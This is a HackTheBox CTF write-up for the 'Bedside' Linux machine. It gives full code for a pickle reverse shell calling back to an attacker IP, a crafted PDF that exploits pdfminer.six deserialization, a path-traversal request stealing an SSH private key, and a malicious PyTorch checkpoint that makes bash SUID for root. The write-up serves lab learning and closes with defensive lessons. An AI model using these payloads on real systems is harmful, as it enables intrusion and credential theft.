---
title: "HackTheBox — Bedside (Linux / Medium)"
date: 2026-08-07 02:15:00 +0530
categories: [CTF, HackTheBox]
tags: [linux, cve-2025-64512, pdfminer, pickle-deserialization, rce, path-traversal, pytorch, container, ssh, suid, privilege-escalation, python]
author: Prince_kumar
math: false
mermaid: false
---

> **When a PDF parser trusts user-controlled encoding names and a machine learning trainer loads unchecked checkpoints, pickle deserialization becomes the key to total compromise.**  
> This is the story of Bedside — a medium-difficulty Linux machine that chains insecure pickle deserialization in pdfminer.six, internal path traversal via esm.sh, and a PyTorch checkpoint injection to escalate from unauthenticated web access to root.

---

## Challenge Info

| Field        | Value                        |
|--------------|------------------------------|
| Platform     | HackTheBox                   |
| Box Name     | Bedside                      |
| OS           | Linux                        |
| Difficulty   | Medium                       |
| Techniques   | CVE-2025-64512 (pdfminer.six insecure pickle deserialization → RCE), Path traversal via esm.sh proxy, PyTorch checkpoint injection, SUID shell |
| Tools Used   | nmap, ffuf, curl, python3, netcat, ssh |

---

## 🕚 11:00 — Reconnaissance & Enumeration

### Port Scan

```bash
$ nmap -sC -sV 10.129.107.216
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache/2.4.68 (Debian)
```

Only SSH and HTTP are exposed. Add the hostnames to `/etc/hosts`:

```bash
$ echo "10.129.107.216 bedside.htb research.bedside.htb" >> /etc/hosts
```

### Virtual Host Discovery

```bash
$ ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```

Found: `research.bedside.htb`

### Fingerprinting the Research Portal

```bash
$ curl -I http://research.bedside.htb
X-Powered-By: pdfminer.six
```

This immediately tells us the PDF library in use. Research shows **CVE-2025-64512** — unsafe pickle deserialization.

---

## 🕦 11:30 — Understanding the Vulnerability: CVE-2025-64512

### Why Pickle Is Dangerous

Python's `pickle` module serialises objects. When you unpickle data, Python calls the special method `__reduce__()` on the object being reconstructed. That method returns a **callable and arguments**. Pickle then calls that callable with the arguments — meaning **arbitrary code execution**.

```python
class Evil:
    def __reduce__(self):
        return (os.system, ('id',))
```

Pickling this object and later unpickling it will run `os.system('id')`.

### How pdfminer Triggers It

`pdfminer.six` uses pickled `.pickle.gz` files to store font CMap data. When a PDF contains a font with a custom `/Encoding`, pdfminer builds a filename by appending `.pickle.gz` to the encoding name, then loads and **unpickles** that file. The encoding name comes directly from the PDF — we control it.

By crafting a PDF with `/Encoding` set to an **absolute path** like `/var/www/.../uploads/payload`, pdfminer will try to load `/var/www/.../uploads/payload.pickle.gz` and unpickle it.

### Attack Chain

1. Upload a malicious `.pickle.gz` file to the web server (via the normal upload form).
2. Upload a PDF that references that exact file path in its `/Encoding` field.
3. The background worker (`pdf_watcher.py`) runs `pdf2txt.py` on every PDF it finds.
4. `pdf2txt.py` parses the PDF, hits the malicious `/Encoding`, loads our pickle, and **executes our code**.

---

## 🕛 12:00 — Initial Foothold: Remote Code Execution

### Step 1: Find the Absolute Upload Path

Upload a benign JPEG and check the error message:

```bash
$ curl -s -F "uploadFile=@test.jpg" http://research.bedside.htb/ | grep message
```

The response leaks the path:

```
MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads
```

### Step 2: Create the Malicious Pickle

We use a Python reverse shell. Save this as `exploit.py`:

```python
import pickle, gzip, os

class RCE:
    def __reduce__(self):
        cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.44\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
        return (os.system, (cmd,))

# Generate the payload file
with gzip.open('payload.pickle.gz', 'wb') as f:
    pickle.dump(RCE(), f)
print("[+] payload.pickle.gz created")
```

### Step 3: Create the Trigger PDF

The PDF must have a valid structure and a `/Encoding` that points to our payload (without the `.pickle.gz` extension). pdfminer appends `.pickle.gz` automatically.

```python
# continued in exploit.py

pdf = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources
<<
/Font
<<
/F1 5 0 R
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Malicious PDF) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fpayload
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /MaliciousFont
/CIDSystemInfo
<<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj
7 0 obj
<<
/Type /FontDescriptor
/FontName /MaliciousFont
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF"""

with open('trigger.pdf', 'wb') as f:
    f.write(pdf)
print("[+] trigger.pdf created")
```

> **Note:** The `/Encoding` value `/#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fpayload` is URL-encoded for the PDF. `#2F` is `/`. The decoded path becomes `/var/www/research.bedside.htb/uploads/payload`. pdfminer appends `.pickle.gz` → loads our file.

### Step 4: Upload and Catch the Shell

Start a listener:

```bash
$ nc -lvnp 4444
```

Upload the pickle first, then the PDF:

```bash
$ curl -s -F "uploadFile=@payload.pickle.gz" http://research.bedside.htb/ | grep message
$ curl -s -F "uploadFile=@trigger.pdf" http://research.bedside.htb/ | grep message
```

Within 30 seconds, the worker processes `trigger.pdf` and you receive a reverse shell:

```
Connection received on 10.129.107.216
id
uid=988(datawrangler) gid=1001(dataops)
```

Upgrade to a full PTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z, then:
stty raw -echo; fg
```

---

## 🕧 12:30 — Container Enumeration & Path Traversal

### Internal Port Scan

```bash
datawrangler@bedside:~$ timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/3000" 2>/dev/null && echo "Port 3000 open"
```

Port 3000 is an internal **esm.sh** development server.

### Path Traversal to Steal SSH Key

The esm.sh proxy resolves package paths without sanitisation. We can traverse out of its module directory to read arbitrary files:

```bash
datawrangler@bedside:~$ curl --path-as-is "http://127.0.0.1:3000/react@18.3.1/es2022/../../../../../../../../home/developer/.ssh/id_rsa?raw"
```

Copy the entire private key.

---

## 🕐 13:00 — SSH as Developer & User Flag

On your attack box:

```bash
$ cat > dev_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
...paste key...
-----END OPENSSH PRIVATE KEY-----
EOF
$ chmod 600 dev_key
$ ssh -i dev_key developer@10.129.107.216
developer@bedside:~$ cat user.txt
<REDACTED>
```

**User flag captured! 🎉**

---

## 🕐 13:30 — Privilege Escalation to Root

### Enumerate Sudo Rights

```bash
developer@bedside:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

### Understand the Trainer Script

The trainer loads a PyTorch checkpoint from `/datastore/checkpoints/` using `torch.load(weights_only=False)`. This is **pickle** again! We can craft a malicious `.pt` file that executes commands when loaded.

### Creating the Malicious Checkpoint

From the **container shell** (datawrangler), we write a checkpoint that runs `chmod u+s /bin/bash` (makes bash SUID so we can run it as root):

```bash
datawrangler@bedside:~$ python3 << 'PYEOF'
import pickle, os, zipfile, io

class RCE:
    def __reduce__(self):
        return (os.system, ('chmod u+s /bin/bash',))

payload = {'epoch': 1, 'model': RCE(), 'optimizer': {}}
p = pickle.dumps(payload, protocol=5)

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('pwn/version', b'3\n')
    zf.writestr('pwn/data.pkl', p)

with open('/datastore/checkpoints/pwn.pt', 'wb') as f:
    f.write(buf.getvalue())
print("[+] pwn.pt created")
PYEOF
```

### Ensure Training Data Exists

The trainer needs at least one image in `/datastore/staging/`. Clean any old files and put a valid PNG:

```bash
datawrangler@bedside:~$ rm -rf /datastore/staging/* /datastore/processed/*
datawrangler@bedside:~$ echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > /datastore/staging/valid.png
```

### Trigger the Trainer

From the **developer SSH** session:

```bash
developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The script loads `pwn.pt`, unpickles it, and our RCE runs as root. It will then crash, but the SUID bit is already set.

### Get Root

```bash
developer@bedside:~$ ls -la /bin/bash   # should show -rwsr-xr-x (SUID)
developer@bedside:~$ /bin/bash -p
# id
uid=1000(developer) gid=1000(developer) euid=0(root)
# cat /root/root.txt
<REDACTED>
```

**Rooted! 🏆**

---

## The Fundamentals Behind the Box

Bedside is a masterclass in Python deserialization attacks. Both the initial foothold and the privilege escalation exploit the same fundamental primitive — Python's `pickle` module and its dangerous `__reduce__()` method. The box demonstrates how a single class of vulnerability can appear in completely different contexts.

This section breaks down the core fundamental mechanisms that make each step of the Bedside challenge possible.

### 1. Python Pickle Deserialization: The Core Primitive

Python's `pickle.load()` reconstructs objects from serialised bytes. The `__reduce__()` magic method returns a tuple of `(callable, args)` — when unpickling, Python calls that callable with those arguments. This means **any class that defines `__reduce__()` can execute arbitrary code on deserialization**.

**Fundamental lesson:** Never unpickle data from untrusted sources. This applies to `.pickle`, `.pkl`, `.pt` (PyTorch), and any format that uses pickle internally.

### 2. pdfminer.six: User-Controlled File Path → Arbitrary Pickle Load

The `pdfminer.six` library uses pickled CMap files for font processing. The `/Encoding` field in a PDF's font dictionary controls which file gets loaded. By setting this to an absolute path, we direct pdfminer to load our malicious pickle.

**Fundamental lesson:** Any application that constructs file paths from user input is potentially vulnerable. PDF parsers are particularly dangerous because PDFs are complex and contain many attacker-controllable fields.

### 3. Virtual Host Enumeration & Subdomain Discovery

The main domain `bedside.htb` didn't reveal the attack surface — `research.bedside.htb` did. FFUF with a subdomain wordlist discovered the hidden vhost.

**Fundamental lesson:** Always enumerate virtual hosts and subdomains. The most interesting attack surface is often hidden behind name-based virtual hosting.

### 4. Error-Based Information Disclosure

Uploading a JPEG to the research portal leaked the absolute filesystem path in the error message. This information was critical for constructing the correct `/Encoding` path in our PDF.

**Fundamental lesson:** Application errors often reveal internal paths, stack traces, and configuration details. Always trigger errors deliberately during enumeration.

### 5. Internal Service Path Traversal (esm.sh)

The esm.sh proxy on port 3000 resolved package paths without sanitization. Using `../` sequences, we traversed outside the module directory to read the developer's SSH private key.

**Fundamental lesson:** Path traversal remains one of the most common web vulnerabilities. Internal services are often less hardened than external-facing ones.

### 6. PyTorch Checkpoint Injection

`torch.load(weights_only=False)` uses pickle internally. A crafted `.pt` checkpoint file with a malicious `__reduce__()` method executes arbitrary code when loaded. Combined with `sudo` execution, this becomes root RCE.

**Fundamental lesson:** Machine learning model files (`.pt`, `.pkl`, `.h5`) are often trusted implicitly. Never load model checkpoints from untrusted sources with `weights_only=False`.

### 7. SUID Binary Privilege Preservation

Copying `/bin/bash` with the SUID bit set and executing with `-p` preserves the effective UID (root), granting a root terminal.

**Fundamental lesson:** When creating SUID shells, always use the `-p` flag to prevent bash from dropping privileges.

---

## Summary of RCE Mechanisms

| Vector | Mechanism |
|--------|-----------|
| **pdfminer.six** | Unsafely unpickles a file whose path is attacker-controlled via a PDF's `/Encoding` field |
| **PyTorch** | `torch.load(weights_only=False)` uses pickle internally, enabling the same attack |

Both exploit Python's fundamental pickle behaviour: `__reduce__()` allows arbitrary callables to be executed during deserialisation.

---

## Vulnerability Summary

| Stage | Vulnerability / Misconfiguration | Impact |
|-------|----------------------------------|--------|
| **Foothold** | CVE-2025-64512 (pdfminer.six insecure pickle deserialization) | RCE as `datawrangler` |
| **Lateral Move** | esm.sh path traversal (internal port 3000) | SSH key theft → access as `developer` |
| **Escalation** | PyTorch checkpoint injection via `torch.load(weights_only=False)` with sudo | SUID bash → root |

---

## Key Takeaways

1. **Pickle deserialization is inherently dangerous:** The same attack primitive powered both the initial foothold and the privilege escalation — never unpickle untrusted data.
2. **PDF parsers process complex, attacker-controlled structures:** Custom fonts, encodings, and embedded objects create a vast attack surface.
3. **Internal services are often less hardened:** The esm.sh proxy on localhost had no path sanitization, enabling SSH key theft.
4. **ML model files are code, not data:** Treat `.pt` checkpoints with the same suspicion as executable files.
